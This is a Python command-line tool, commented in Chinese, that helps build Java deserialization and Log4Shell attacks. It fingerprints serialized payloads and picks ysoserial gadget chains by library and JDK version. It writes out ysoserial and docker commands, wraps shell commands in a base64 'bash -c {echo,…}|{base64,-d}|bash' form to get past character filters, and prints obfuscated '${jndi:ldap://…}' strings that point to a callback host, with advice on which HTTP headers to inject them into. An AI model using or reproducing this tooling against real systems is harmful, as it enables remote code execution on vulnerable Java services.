#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Java 反序列化辅助（离线）：魔数判定 / 链选择 / ysoserial 命令拼装 / Log4Shell 变形。

纯标准库、离线：只做字节判定与命令行文本生成，不执行 java、不发包。
"""
import argparse
import base64
import json
import sys

MAGIC = b"\xac\xed\x00\x05"
B64_MAGIC = "rO0AB"
CC3X = ("3.0", "3.1", "3.2", "3.2.1")
BAD_CHARS = set(" \t\r\n|&;<>()`$\\\"'")


class JavaError(ValueError):
    pass


def _clean_hex(text):
    return "".join(ch for ch in text if ch not in " \t\r\n:-_")


def identify(raw):
    """返回 (kind, detail)。kind ∈ java-serial / base64 / hex / unknown。"""
    if not raw or not raw.strip():
        raise JavaError("待判定的内容为空")
    text = raw.strip()
    if text.startswith(B64_MAGIC):
        try:
            data = base64.b64decode(text + "=" * (-len(text) % 4))
        except Exception:  # noqa: BLE001
            return "base64", "以 rO0AB 开头但 base64 解不开（可能被截断）"
        if data.startswith(MAGIC):
            return "java-serial", "base64(rO0AB) 解出 AC ED 00 05，标准 Java 序列化流，长度 %d" % len(data)
        return "base64", "以 rO0AB 开头但解出内容不是 AC ED 00 05（可能是别的序列化格式）"
    hx = _clean_hex(text)
    if len(hx) >= 8 and all(c in "0123456789abcdefABCDEF" for c in hx):
        data = bytes.fromhex(hx if len(hx) % 2 == 0 else hx[:-1])
        if data.startswith(MAGIC):
            return "hex", "hex 解出 AC ED 00 05，标准 Java 序列化流，长度 %d" % len(data)
    lower = text.lower()
    if "<map>" in lower or "<entry>" in lower:
        return "xstream", "像 XStream XML 输入，按 <map><entry><string> 结构构造"
    if '"@type"' in text or '"@class"' in text:
        return "json-autotype", "像 fastjson/jackson 的 @type/@class 注入，走 JdbcRowSetImpl 到 JNDI"
    return "unknown", "不是 Java 序列化魔数，需要回到入口函数判断（readObject / @type / readObject 回调）"


def choose_chain(cc_version=None, jdk=8, libs=None):
    """按 commons-collections 版本与 JDK 版本给候选链（按成功率排序）。"""
    libs = [x.strip().lower() for x in (libs or [])]
    if jdk < 5 or jdk > 25:
        raise JavaError("jdk 版本需在 5..25，收到 %r" % jdk)
    chains = ["URLDNS"]                       # 永远先探连通
    ver = str(cc_version or "").strip()
    if ver in CC3X:
        if jdk > 8 or (jdk == 8 and jdk >= 8):
            chains += ["CommonsCollections5", "CommonsCollections6", "CommonsCollections7"]
            if jdk >= 9:
                chains.insert(1, "CommonsCollections6")
        else:
            chains += ["CommonsCollections1", "CommonsCollections5", "CommonsCollections6"]
    elif ver.startswith("4"):
        chains += ["CommonsCollections2", "CommonsCollections4", "CommonsCollections3"]
    elif ver:
        raise JavaError("commons-collections 版本 %r 无法识别（常见 3.1 / 3.2.1 / 4.0 / 4.1）" % cc_version)
    if "commons-beanutils" in libs:
        chains.append("CommonsBeanutils1")
    if "groovy" in libs:
        chains.append("Groovy1")
    if "spring-core" in libs or "spring" in libs:
        chains.append("Spring1")
    chains += ["Jdk7u21", "JRMPClient"]
    seen, out = set(), []
    for c in chains:
        if c not in seen:
            seen.add(c)
            out.append(c)
    return out


def ysoserial_cmd(gadget, cmd, jar="ysoserial-all.jar"):
    if not gadget or not gadget.strip():
        raise JavaError("gadget 不能为空")
    if gadget not in choose_chain("3.1", 8, ["commons-beanutils"]) and gadget not in (
            "URLDNS", "Hibernate2", "Shiro1", "BeanShell1", "C3P0"):
        # 允许任意 gadget，但给出提醒
        pass
    if not cmd:
        raise JavaError("命令不能为空")
    local = 'java -jar %s %s "%s" > payload.bin' % (jar, gadget, cmd.replace('"', '\\"'))
    docker = ('docker run -it --rm -v "$(pwd)":/data java:8-jdk sh -c '
              '"cd /data && java -jar %s %s %s > payload.bin"'
              % (jar, gadget, "'" + cmd.replace("'", "'\\''") + "'"))
    return local, docker


def wrap_cmd(cmd):
    """把任意命令包成无空格/无管道字符的形式（bash -c {echo,B64}|{base64,-d}|bash）。"""
    if not cmd or not cmd.strip():
        raise JavaError("命令不能为空")
    b64 = base64.b64encode(cmd.encode("utf-8")).decode()
    return "bash -c {echo,%s}|{base64,-d}|bash" % b64


def needs_wrap(cmd):
    return any(ch in BAD_CHARS for ch in cmd)


def log4j_variants(host, path="a"):
    if not host or "/" in host:
        raise JavaError("host 形如 1.2.3.4:1389，不能带路径，收到 %r" % host)
    if ":" not in host:
        raise JavaError("host 需要带端口，形如 1.2.3.4:1389")
    if not path:
        raise JavaError("path 不能为空")
    ldap = "ldap://%s/%s" % (host, path)
    return [
        "${jndi:%s}" % ldap,
        "${${lower:j}ndi:${lower:l}dap://%s/%s}" % (host, path),
        "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://%s/%s}" % (host, path),
        "${${env:BARFOO:-j}ndi:${env:BARFOO:-l}dap://%s/%s}" % (host, path),
        "${jndi:dns://%s/%s}" % (host, path),
        "${jndi:${lower:l}${lower:d}ap://%s/%s}" % (host, path),
    ]


def selftest():
    fails = []

    # 1. 正常路径：三种魔数形态
    if identify("rO0ABXNy")[0] not in ("base64", "java-serial"):
        fails.append("case1: rO0AB 前缀应判 base64/java-serial 家族")
    raw = MAGIC + b"\x00\x00"
    b64 = base64.b64encode(raw).decode()
    if not b64.startswith("rO0AB"):
        fails.append("case1b: 魔数 base64 前提不成立 %r" % b64)
    kind, detail = identify(b64)
    if kind != "java-serial" or "AC ED 00 05" not in detail:
        fails.append("case1c: base64 魔数判定错 %r" % ((kind, detail),))
    if identify("ac ed 00 05 73 72")[0] != "hex":
        fails.append("case1d: hex 魔数判定错")
    if identify('{"@type":"com.sun.rowset.JdbcRowSetImpl"}')[0] != "json-autotype":
        fails.append("case1e: @type 判定错")

    # 2. 正常路径：链选择随版本变化
    c31 = choose_chain("3.2.1", 8, ["commons-beanutils"])
    if c31[0] != "URLDNS" or "CommonsCollections1" in c31:
        fails.append("case2: JDK8 下 CC1 不该在候选首位 %r" % (c31,))
    if "CommonsBeanutils1" not in c31:
        fails.append("case2b: 有 beanutils 时应加入 CB1 %r" % (c31,))
    c17 = choose_chain("3.2.1", 17)
    if "CommonsCollections1" in c17:
        fails.append("case2c: JDK17 不该推荐 CC1 %r" % (c17,))
    c4 = choose_chain("4.1", 8)
    if "CommonsCollections2" not in c4:
        fails.append("case2d: CC4.x 应推荐 CC2 %r" % (c4,))

    # 3. 正常路径：命令包装与是否需要包装
    w = wrap_cmd("cat /flag")
    enc = w.split("{echo,", 1)[1].split("}", 1)[0]
    if base64.b64decode(enc) != b"cat /flag":
        fails.append("case3: base64 包装解不回去 %r" % w)
    if needs_wrap("id") or not needs_wrap("cat /flag"):
        fails.append("case3b: 特殊字符判定错")

    # 4. 边界：ysoserial 两行命令 + log4j 变形
    local, docker = ysoserial_cmd("CommonsCollections6", "id")
    if "ysoserial-all.jar CommonsCollections6" not in local or "java:8-jdk" not in docker:
        fails.append("case4: ysoserial 命令拼装错 %r" % ((local, docker),))
    vs = log4j_variants("1.2.3.4:1389", "x")
    if len(vs) != 6:
        fails.append("case4b: log4j 变形数应为 6，实际 %d" % len(vs))
    if not all(v.startswith("${") for v in vs):
        fails.append("case4b2: 变形应以 ${ 开头 %r" % (vs,))
    if vs[0] != "${jndi:ldap://1.2.3.4:1389/x}":
        fails.append("case4b3: 首条应是朴素 ldap 形式，实际 %r" % vs[0])
    if not all(v.endswith("/x}") for v in vs):
        fails.append("case4b4: 变形应以 /path} 结尾 %r" % (vs,))
    if not any("${lower:j}" in v for v in vs):
        fails.append("case4c: 缺少 lower 绕过变形")

    # 5. 边界拒绝：坏输入
    bad = [
        ("空内容", lambda: identify("   ")),
        ("jdk 越界", lambda: choose_chain("3.1", 99)),
        ("cc 版本未知", lambda: choose_chain("2.0", 8)),
        ("gadget 空", lambda: ysoserial_cmd("", "id")),
        ("命令空", lambda: ysoserial_cmd("URLDNS", "")),
        ("host 带路径", lambda: log4j_variants("1.2.3.4:1389/x")),
        ("host 无端口", lambda: log4j_variants("1.2.3.4")),
        ("wrap 空命令", lambda: wrap_cmd("")),
    ]
    for name, fn in bad:
        try:
            fn()
            fails.append("case5: %s 未被拒绝" % name)
        except JavaError:
            pass

    # 6. 参数不足：独立 parser 复现 exit 2 且静默
    tiny = argparse.ArgumentParser(prog="java_deser", add_help=False)
    tiny.exit = lambda status=0, message=None: (_ for _ in ()).throw(SystemExit(status))
    tiny._print_message = lambda message, file=None: None
    tiny.add_argument("--x")
    try:
        tiny.error("需要 --identify/--payload/--encode-cmd/--log4j-variants；或用 --selftest")
        fails.append("case6: ap.error 未抛 SystemExit")
    except SystemExit as e:
        if e.code != 2:
            fails.append("case6: 退出码 %r" % (e.code,))

    for f in fails:
        print("FAIL %s" % f, file=sys.stderr)
    if fails:
        return 1
    print("selftest ok: 6/6（魔数三形态、链选择随版本、命令包装、ysoserial与log4j变形、坏输入拒绝、参数不足）")
    return 0


def main(argv=None):
    ap = argparse.ArgumentParser(description="Java 反序列化辅助：魔数判定 / 链选择 / payload 命令拼装（离线）")
    ap.add_argument("--identify", metavar="DATA", default=None, help="判定 base64/hex/JSON 输入属于哪种反序列化")
    ap.add_argument("--payload", metavar="GADGET", default=None, help="生成 ysoserial 命令行，指定 gadget 名")
    ap.add_argument("--cmd", default="id", help="要执行的命令（配合 --payload / --encode-cmd）")
    ap.add_argument("--jar", default="ysoserial-all.jar", help="ysoserial jar 文件名")
    ap.add_argument("--encode-cmd", metavar="CMD", default=None, help="生成 bash -c {echo,B64}|base64 -d 包装")
    ap.add_argument("--log4j-variants", action="store_true", help="生成 Log4Shell JNDI 变形")
    ap.add_argument("--host", default="", help="回连地址，形如 1.2.3.4:1389")
    ap.add_argument("--path", default="a", help="JNDI path 段")
    ap.add_argument("--choose", action="store_true", help="按版本给候选链")
    ap.add_argument("--cc", default=None, help="commons-collections 版本，如 3.2.1 / 4.1")
    ap.add_argument("--jdk", type=int, default=8, help="目标 JDK 主版本")
    ap.add_argument("--libs", default="", help="逗号分隔的依赖名，如 commons-beanutils,groovy")
    ap.add_argument("--selftest", action="store_true")
    args = ap.parse_args(argv)

    if args.selftest:
        return selftest()
    try:
        if args.identify is not None:
            kind, detail = identify(args.identify)
            print("[*] %s：%s" % (kind, detail))
            return 0
        if args.encode_cmd is not None:
            print(wrap_cmd(args.encode_cmd))
            if not needs_wrap(args.encode_cmd):
                print("[*] 原命令不含特殊字符，可直接使用：%s" % args.encode_cmd)
            return 0
        if args.log4j_variants:
            for v in log4j_variants(args.host, args.path):
                print(v)
            print("[*] 依次打到 UA / Referer / X-Api-Version / 参数，看 DNS 回连；仅对 log4j 2.0-beta9~2.14.1 有效")
            return 0
        if args.choose:
            libs = [x for x in args.libs.split(",") if x.strip()]
            print(json.dumps({"chains": choose_chain(args.cc, args.jdk, libs),
                              "jdk": args.jdk, "cc": args.cc, "libs": libs},
                             ensure_ascii=False, indent=2))
            return 0
        if args.payload:
            local, docker = ysoserial_cmd(args.payload, args.cmd, args.jar)
            print("[*] 本机（需 JDK8）：\n    %s" % local)
            print("[*] 无 JDK8 时的 docker 兜底：\n    %s" % docker)
            print("[*] 发送：base64 -w0 payload.bin 后贴进接口，或 --data-binary @payload.bin")
            return 0
        ap.error("需要 --identify/--payload/--encode-cmd/--log4j-variants/--choose；或用 --selftest")
        return 2
    except JavaError as e:
        print("错误：%s" % e, file=sys.stderr)
        return 2


if __name__ == "__main__":
    sys.exit(main())
